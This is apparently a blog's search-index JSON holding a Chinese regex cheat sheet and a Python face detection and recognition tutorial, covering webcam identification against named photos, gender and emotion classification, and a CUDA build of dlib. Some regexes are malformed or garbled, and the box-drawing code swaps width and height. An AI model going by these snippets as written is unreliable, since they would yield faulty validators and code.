电话号码(\"XXX-XXXXXXX\"、\"XXXX-XXXXXXXX\"、\"XXX-XXXXXXX\"、\"XXX-XXXXXXXX\"、\"XXXXXXX\"和\"XXXXXXXX)：^(\\(\\d{3,4}-) | \\d{3.4}-)?\\d{7,8}$ 国内电话号码(0511-4405222、021-87888822)：\\d{3}-\\d{8} | \\d{4}-\\d{7} 电话号码正则表达式（支持手机号码，3-4位区号，7-8位直播号码，1－4位分机号）: ((\\d{11}) | ^((\\d{7,8}) | (\\d{4} | \\d{3})-(\\d{7,8}) | (\\d{4} | \\d{3})-(\\d{7,8})-(\\d{4} | \\d{3} | \\d{2} | \\d{1}) | (\\d{7,8})-(\\d{4} | \\d{3} | \\d{2} | \\d{1}))$) 身份证号(15位、18位数字)，最后一位是校验位，可能为数字或字符X：(^\\d{15}$) | (^\\d{18}$) | (^\\d{17}(\\d | X | x)$) 帐号是否合法(字母开头，允许5-16字节，允许字母数字下划线)：^[a-zA-Z][a-zA-Z0-9_]{4,15}$ 密码(以字母开头，长度在6~18之间，只能包含字母、数字和下划线)：^[a-zA-Z]\\w{5,17}$ 强密码(必须包含大小写字母和数字的组合，不能使用特殊字符，长度在 8-10 之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z])[a-zA-Z0-9]{8,10}$ 强密码(必须包含大小写字母和数字的组合，可以使用特殊字符，长度在8-10之间)：^(?=.*\\d)(?=.*[a-z])(?=.*[A-Z]).{8,10}$ 日期格式：^\\d{4}-\\d{1,2}-\\d{1,2} 一年的12个月(01～09和1～12)：^(0?[1-9] | 1[0-2])$ 一个月的31天(01～09和1～31)：^((0?[1-9]) | ((1 | 2)[0-9]) | 30 | 31)$ 钱的输入格式： 有四种钱的表示形式我们可以接受:\"10000.00\" 和 \"10,000.00\", 和没有 \"分\" 的 \"10000\" 和 \"10,000\"：^[1-9][0-9]*$ 这表示任意一个不以0开头的数字,但是,这也意味着一个字符\"0\"不通过,所以我们采用下面的形式：^(0 | [1-9][0-9]*)$ 一个0或者一个不以0开头的数字.我们还可以允许开头有一个负号：^(0 | -?[1-9][0-9]*)$ 这表示一个0或者一个可能为负的开头不为0的数字.让用户以0开头好了.把负号的也去掉,因为钱总不能是负的吧。下面我们要加的是说明可能的小数部分：^[0-9]+(.[0-9]+)?$ 必须说明的是,小数点后面至少应该有1位数,所以\"10.\"是不通过的,但是 \"10\" 和 \"10.2\" 是通过的：^[0-9]+(.[0-9]{2})?$ 这样我们规定小数点后面必须有两位,如果你认为太苛刻了,可以这样：^[0-9]+(.[0-9]{1,2})?$ 这样就允许用户只写一位小数.下面我们该考虑数字中的逗号了,我们可以这样：^[0-9]{1,3}(,[0-9]{3})*(.[0-9]{1,2})?$ 1到3个数字,后面跟着任意个 逗号+3个数字,逗号成为可选,而不是必须：^([0-9]+ | [0-9]{1,3}(,[0-9]{3})*)(.[0-9]{1,2})?$ 备注：这就是最终结果了,别忘了\"+\"可以用\"*\"替代如果你觉得空字符串也可以接受的话(奇怪,为什么?)最后,别忘了在用函数时去掉去掉那个反斜杠,一般的错误都在这里 xml文件：^([a-zA-Z]+-?)+[a-zA-Z0-9]+\\\\.[x | X][m | M][l | L]$ 中文字符的正则表达式：[\\u4e00-\\u9fa5] 双字节字符：[^\\x00-\\xff] (包括汉字在内，可以用来计算字符串的长度(一个双字节字符长度计2，ASCII字符计1)) 空白行的正则表达式：\\n\\s*\\r (可以用来删除空白行) HTML标记的正则表达式：]*.*? | (首尾空白字符的正则表达式：^\\s* | \\s*$或(^\\s*) | (\\s*$) (可以用来删除行首行尾的空白字符(包括空格、制表符、换页符等等)，非常有用的表达式) 腾讯QQ号：[1-9][0-9]{4,} (腾讯QQ号从10000开始) 中国邮政编码：[1-9]\\d{5}(?!\\d) (中国邮政编码为6位数字) IP地址：((?:(?:25[0-5] | 2[0-4]\\\\d | [01]?\\\\d?","date":"2018-10-14","objectID":"https://lgf.im/posts/learn/simple-regular-expression-use/:1:0","tags":["regex","coding"],"title":"简单正则表达式使用","uri":"https://lgf.im/posts/learn/simple-regular-expression-use/"},{"categories":["coding"],"content":"正则表达式学习网站 正则表达式在线测试-站长工具 正则表达式在线测试-菜鸟工具 正则表达式教程-菜鸟教程 ","date":"2018-10-14","objectID":"https://lgf.im/posts/learn/simple-regular-expression-use/:2:0","tags":["regex","coding"],"title":"简单正则表达式使用","uri":"https://lgf.im/posts/learn/simple-regular-expression-use/"},{"categories":["coding"],"content":"这里我们将要介绍如何使用python进行简单的人脸检测与人脸识别，并且通过gpu来加速。 注意：这里都是基础内容，如果需要更加强大深入的请出门左转。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:0:0","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"一、环境搭建与资源下载 下面介绍简单人脸检测与识别需要使用到的几个重要依赖。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:1:0","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"基础环境 我所使用的环境是windows 10 + python3.6(64位) ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:1:1","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"python库 numpy OpenCV Dlib face_recognition haarcascades shape_predictor 小基础 python安装依赖可以选择在线安装，如 pip install 依赖名 也可以选择使用whl文件安装，如 pip install whl文件位置 1. python扩展程序集：numpy 基于我的环境，我使用的是numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl这个版本，大家可以根据自己环境选择适合自己的版本下载。 安装使用命令 pip3 install numpy‑1.15.2+mkl‑cp36‑cp36m‑win_amd64.whl 2. 计算机视觉库：OpenCV 我使用的是opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl这个版本。 安装使用命令 pip3 install opencv_python‑3.4.3‑cp36‑cp36m‑win_amd64.whl 3. 机器学习c++算法库：Dlib 我使用的是dlib-19.8.1-cp36-cp36m-win_amd64.whl。 安装使用命令 pip3 install dlib-19.8.1-cp36-cp36m-win_amd64.whl 4. 人脸识别集成库：face_recognition 安装使用命令 pip3 install face_recognition 5. 深度学习库：Keras 安装使用命令 pip3 install keras 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 6. 机器学习框架：TensorFlow 安装使用命令： pip3 install tensorflow 前面部分用不到，后面高级应用会用到，可提前下载安装，也可后面需要的时候安装 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:1:2","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"人脸识别用到的数据模型 基于目前的数据量和个人知识与能力，我还不能自己利用机器学习来训练数据模型，所以使用的是国外别人已经训练好的数据模型。 1. OpenCV使用到的人脸分类模型xml：haarcascades 上面链接中所有的xml都推荐下载到本地备用，我所使用的是haarcascade_frontalface_default.xml 2. Dlib使用到的人脸识别训练模型：shape_predictor 我所使用的是shape_predictor_68_face_landmarks.dat.bz2和shape_predictor_5_face_landmarks.dat.bz2这两个。 推荐大家把这两个都下载下来，并解压，我们所需要的是里面的dat数据文件。 好了，有了上面的这些基础环境与依赖，我们可以继续我们接下来的简单人脸检测与识别了。 没有装好这些环境的同学请注意了，我们班级已经与谷歌、百度等大公司达成合作，有任何问题请在Google和Baidu进行搜索，他们会提供你所需要的答案。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:1:3","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"二、简单人脸检测 在这一节不会讲解复杂的人脸识别，只是先通过简单的小例子让大家先了解一下人脸识别需要用到什么、人脸识别的基本步骤等等最简单的内容。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:2:0","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"1. 利用OpenCV进行图片人脸检测并进行标注 实现思路 先将图片灰度化，为了降低图片颜色维度，减少后续识别计算量 然后利用OpenCV加载别人训练好的人脸分类器，通过这个分类器来检测人脸 在原图片上画一个矩形，然后显示出来 实现代码 import cv2 filepath = \"img/sdu/6.jpg\" classifier = cv2.CascadeClassifier( \"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) img = cv2.imread(filepath) # 读取图片 gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) # 灰度化 color = (0, 255, 0) # 定义绘制颜色 # 调用识别人脸 faceRects = classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(32, 32)) if len(faceRects): # 大于0则检测到人脸 for faceRect in faceRects: # 单独框出每一张人脸 x, y, w, h = faceRect # 框出人脸 cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:2:1","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"2. 利用OpenCV进行视频人脸检测并进行标注 在人脸检测方面实现方法与上面图片的实现方法一模一样，只是这个图片是从摄像头不断获取的。 实现代码 import cv2 def scan(img): grayImg = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) classifier = cv2.CascadeClassifier( \"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) color = (0, 255, 0) # 定义绘制颜色 faceRects = classifier.detectMultiScale( grayImg, scaleFactor=1.2, minNeighbors=3, minSize=(32, 32)) if len(faceRects): # 大于0则检测到人脸 for faceRect in faceRects: # 单独框出每一张人脸 x, y, w, h = faceRect cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) cv2.imshow(\"image\", img) cap = cv2.VideoCapture(0) while (1): ret, frame = cap.read() scan(frame) if cv2.waitKey(1) \u0026 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:2:2","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"3. 利用Dlib进行图片人脸检测并标注 Dlib里面有很多算法，可以实现一些复杂的人脸识别。 在这一小节只演示用dlib内部自带的默认的人脸识别模型来进行人脸检测 实现代码 import cv2 import dlib path = \"img/sdu/658.jpg\" img = cv2.imread(path) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) #人脸分类器 detector = dlib.get_frontal_face_detector() dets = detector(gray, 1) for face in dets: #在图片中标注人脸边框，并显示 left = face.left() top = face.top() right = face.right() bottom = face.bottom() cv2.rectangle(img, (left, top), (right, bottom), (0, 255, 0), 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:2:3","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"4. 利用Dlib进行视频人脸检测并进行标注 都是相同的步骤呀，与上面大同小异 实现代码 import cv2 import dlib detector = dlib.get_frontal_face_detector() #使用默认的人类识别器模型 def scan(img): gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) dets = detector(gray, 1) for face in dets: left = face.left() top = face.top() right = face.right() bottom = face.bottom() cv2.rectangle(img, (left, top), (right, bottom), (0, 255, 0), 2) cv2.imshow(\"image\", img) cap = cv2.VideoCapture(0) while (1): ret, img = cap.read() scan(img) if cv2.waitKey(1) \u0026 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows() 在两个视频中人脸检测中，我们发现 在识别准确率上 Dlib \u003e OpenCV 但是在速度上 OpenCV \u003e Dlib 后面我们会有专门的内容讲解通过GPU加速Dlib ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:2:4","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"三、稍微复杂的人脸检测与识别 上面已经介绍过了简单的从一张图片或视频中的每一帧中检测到人脸并进行画框 在这一小节，我们会进一步利用Dlib这个库中更加强大的工具来实现稍微发杂一些的人脸检测任务 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:3:0","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"1. 检测人脸的5个关键点和68个关键点并显示出来 实现代码 import cv2 import dlib path = \"img/ag.png\" img = cv2.imread(path) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) #人脸分类器 detector = dlib.get_frontal_face_detector() # 获取人脸检测器 predictor = dlib.shape_predictor( \"lib/dlib/shape_predictor_68_face_landmarks.dat\" #这里使用68点的模型，将68改成5就是使用5点的模型 ) dets = detector(gray, 1) for face in dets: shape = predictor(img, face) # 寻找人脸的68个标定点 # 遍历所有点，打印出其坐标，并圈出来. for pt in shape.parts(): pt_pos = (pt.x, pt.y) cv2.circle(img, pt_pos, 1, (0, 255, 0), 2) cv2.imshow(\"image\", img) cv2.waitKey(0) cv2.destroyAllWindows() 上人脸识别的主菜 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:3:1","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"2. 利用face_recognition进行人脸识别 实现代码 import cv2 import face_recognition import os path = \"img/face_5107\" cap = cv2.VideoCapture(0) total_image_name = [] total_face_encoding = [] for fn in os.listdir(path): #fn 表示的是文件名q print(path + \"/\" + fn) total_face_encoding.append( face_recognition.face_encodings( face_recognition.load_image_file(path + \"/\" + fn))[0]) fn = fn[:(len(fn) - 4)] #截取图片名（这里应该把images文件中的图片名命名为为人物名） total_image_name.append(fn) #图片名字列表 while (1): ret, frame = cap.read() # 发现在视频帧所有的脸和face_enqcodings face_locations = face_recognition.face_locations(frame) face_encodings = face_recognition.face_encodings(frame, face_locations) # 在这个视频帧中循环遍历每个人脸 for (top, right, bottom, left), face_encoding in zip( face_locations, face_encodings): # 看看面部是否与已知人脸相匹配。 for i, v in enumerate(total_face_encoding): match = face_recognition.compare_faces( [v], face_encoding, tolerance=0.4) name = \"Unknown\" if match[0]: name = total_image_name[i] break # 画出一个框，框住脸 cv2.rectangle(frame, (left, top), (right, bottom), (0, 0, 255), 2) # 画出一个带名字的标签，放在框下 cv2.rectangle(frame, (left, bottom - 35), (right, bottom), (0, 0, 255), cv2.FILLED) font = cv2.FONT_HERSHEY_DUPLEX cv2.putText(frame, name, (left + 6, bottom - 6), font, 1.0, (255, 255, 255), 1) # 显示结果图像 cv2.imshow('Video', frame) if cv2.waitKey(1) \u0026 0xFF == ord('q'): break cap.release() cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:3:2","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"3. 利用face_recognition进行人脸轮廓绘制 代码实现 import face_recognition from PIL import Image, ImageDraw # 将图片文件加载到numpy 数组中 image = face_recognition.load_image_file(\"img/ag.png\") #查找图像中所有面部的所有面部特征 face_landmarks_list = face_recognition.face_landmarks(image) for face_landmarks in face_landmarks_list: facial_features = [ 'chin', # 下巴 'left_eyebrow', # 左眉毛 'right_eyebrow', # 右眉毛 'nose_bridge', # 鼻樑 'nose_tip', # 鼻尖 'left_eye', # 左眼 'right_eye', # 右眼 'top_lip', # 上嘴唇 'bottom_lip' # 下嘴唇 ] pil_image = Image.fromarray(image) d = ImageDraw.Draw(pil_image) for facial_feature in facial_features: d.line(face_landmarks[facial_feature], fill=(255, 255, 255), width=2) pil_image.show() ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:3:3","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"4. 利用keras实现性别识别 使用keras实现性别识别 模型数据使用的是oarriaga/face_classification的模型 实现代码 import cv2 from keras.models import load_model import numpy as np import chineseText img = cv2.imread(\"img/xingye-1.png\") face_classifier = cv2.CascadeClassifier( \"lib/opencv/haarcascades/haarcascade_frontalface_default.xml\" ) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) faces = face_classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(140, 140)) gender_classifier = load_model( \"classifier/gender_models/simple_CNN.81-0.96.hdf5\") gender_labels = {0: '女', 1: '男'} color = (255, 255, 255) for (x, y, w, h) in faces: face = img[(y - 60):(y + h + 60), (x - 30):(x + w + 30)] face = cv2.resize(face, (48, 48)) face = np.expand_dims(face, 0) face = face / 255.0 gender_label_arg = np.argmax(gender_classifier.predict(face)) gender = gender_labels[gender_label_arg] cv2.rectangle(img, (x, y), (x + h, y + w), color, 2) img = chineseText.cv2ImgAddText(img, gender, x + h, y, color, 30) cv2.imshow(\"Image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:3:4","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"5. 利用keras实现表情识别 实现代码 import cv2 from keras.models import load_model import numpy as np import chineseText import datetime startTime = datetime.datetime.now() emotion_classifier = load_model( 'classifier/emotion_models/simple_CNN.530-0.65.hdf5') endTime = datetime.datetime.now() print(endTime - startTime) emotion_labels = { 0: '生气', 1: '厌恶', 2: '恐惧', 3: '开心', 4: '难过', 5: '惊喜', 6: '平静' } img = cv2.imread(\"img/emotion/emotion.png\") face_classifier = cv2.CascadeClassifier( \"C:\\Python36\\Lib\\site-packages\\opencv-master\\data\\haarcascades\\haarcascade_frontalface_default.xml\" ) gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY) faces = face_classifier.detectMultiScale( gray, scaleFactor=1.2, minNeighbors=3, minSize=(40, 40)) color = (255, 0, 0) for (x, y, w, h) in faces: gray_face = gray[(y):(y + h), (x):(x + w)] gray_face = cv2.resize(gray_face, (48, 48)) gray_face = gray_face / 255.0 gray_face = np.expand_dims(gray_face, 0) gray_face = np.expand_dims(gray_face, -1) emotion_label_arg = np.argmax(emotion_classifier.predict(gray_face)) emotion = emotion_labels[emotion_label_arg] cv2.rectangle(img, (x + 10, y + 10), (x + h - 10, y + w - 10), (255, 255, 255), 2) img = chineseText.cv2ImgAddText(img, emotion, x + h * 0.3, y, color, 20) cv2.imshow(\"Image\", img) cv2.waitKey(0) cv2.destroyAllWindows() ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:3:5","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"四、利用GPU加速Dlib提高效率 在前面的小实验中我们发现了，使用Dlib来实现的人脸检测与识别速度很慢，在视频中很难实现实时性。 所以我们不仅要想，是否可以用GPU加速一下。 以前可能很麻烦，现在英伟达推出的CUDA就专门为了解决这个而生。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:4:0","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"1. 首先下载CUDA CUDA下载链接 下载并安装，不必多说，一路下一步 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:4:1","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"2. 然后下载cudnn cudnn下载链接 这里下载需要注册英伟达账号，注册就行，下载下来后解压，里面提供cudnn库文件以及头文件，需要把cudnn目录下的bin、include以及lib目录中的文件拷贝到相应的cuda目录中的bin、include和lib目录中去。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:4:2","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"3. 安装cmake cmake是要在后面编译Dlib用到的。 cmake下载链接 记住安装并添加path。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:4:3","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"4. 编译Dlib 这里我们跳过，因为后面可以直接在安装Dlib库时让他自动编译，能自动搞何必去麻烦，如果感兴趣可以自己去编译。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:4:4","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"5. 安装支持CUDA的Dlib库（会自动编译） 我们打开64位的cmd（这一个会在安装VS2017的时候提供），或者打开64位的Powershell，在里面运行安装命令 python setup.py install --yes DLIB_USE_CUDA 这一个命令会自动编译Dlib并且安装，就不用操心了。 在cmake编译的过程中可能会报出各种问题，稍微总结一下： 如果出现类似于没找到相应编译器的原因，说明vs安装可能有问题，可能是vs版本比较老，vs安装不正确，或者vs安装不完整。不管怎么说vs的安装时间会需要很长时间，而且由于vs版本的问题，安装新的vs可能会出现各种问题，如果想手动卸载重装就更坑了，这个时候可以用卸载工具进行卸载：https://github.com/Microsoft/VisualStudioUninstaller/releases,下载之后直接解压然后以运行可执行程序，等待自动清理完成，然后重新安装vs； 如果出现类似于找不到cuda的问题，请确认是否正确安装cuda；并且，如果提示找到了cuda但没有正确的cudnn，请确认是否正确地把cudnn中的lib、include和bin目录中的文件拷贝到相应的cuda目录底下； 在使用cmake编译的时候如果你更改了配置，那么需要在cmake‘中点击file中的delete cache，然后重新configure； 有一种很奇葩的现象是，有可能你的机器上已经安装过了cuda和cudnn，并且之前使用cmake configure的时候成功编译完成得到dlib的python库，但是出于某些原因需要重新安装cuda和cudnn，那么不仅需要手动卸载之前的cuda，而且最好也删除site-packages目录中所有和dlib相关的目录和文件，以及cmake输出得到的临时文件，然后重新安装cuda和cudnn，并且按照之前的步骤执行python setup.py install –yes DLIB_USE_CUDA，得到dlib的python库文件。 如果编译顺利，并且中间没有报错，可以新建一个python程序，然后import dlib成功，大功告成。 ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:4:5","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"6. 验证新编译好的Dlib是否支持CUDA python脚本运行 import dlib print(dlib.__) print(dlib.DLIB_USE_CUDA) print(dlib.cuda.get_num_devices()) ","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:4:6","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"},{"categories":["coding"],"content":"人脸检测和识别学习就告一段落了，感谢观看","date":"2018-10-14","objectID":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/:5:0","tags":["python","AI"],"title":"人脸检测与识别基础教程","uri":"https://lgf.im/posts/ai/face-detection-and-recognition-basic-tutorial/"}]